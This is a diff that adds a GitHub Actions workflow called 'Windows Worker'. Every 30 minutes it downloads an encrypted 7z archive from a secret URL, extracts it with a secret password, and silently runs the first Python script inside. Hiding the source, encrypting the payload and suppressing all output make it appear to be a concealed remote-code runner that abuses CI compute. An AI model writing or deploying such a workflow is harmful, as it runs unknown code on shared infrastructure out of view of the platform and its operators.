@@ -1,0 +1,51 @@
+name: Windows Worker
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "*/30 * * * *"
+
+concurrency:
+  group: worker
+  cancel-in-progress: true
+
+jobs:
+  worker:
+    runs-on: windows-latest
+    timeout-minutes: 90
+
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Install
+        shell: powershell
+        run: |
+          choco install 7zip -y --no-progress > $null
+
+      - name: Download
+        shell: powershell
+        env:
+          SRC_URL: ${{ secrets.LINK }}
+        run: |
+          $ProgressPreference = "SilentlyContinue"
+          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "app.7z" > $null
+
+      - name: Extract
+        shell: powershell
+        env:
+          ARCHIVE_KEY: ${{ secrets.PASSWORD }}
+        run: |
+          & "C:\Program Files\7-Zip\7z.exe" x app.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null
+
+      - name: Execute
+        shell: powershell
+        run: |
+          $ErrorActionPreference = "SilentlyContinue"
+
+          $py = Get-ChildItem extracted -Recurse -Filter *.py | Select-Object -First 1
+          if (-not $py) { exit 1 }
+
+          $dir = $py.Directory.FullName
+          cd $dir
+
+          python $py.Name > $null 2>&1
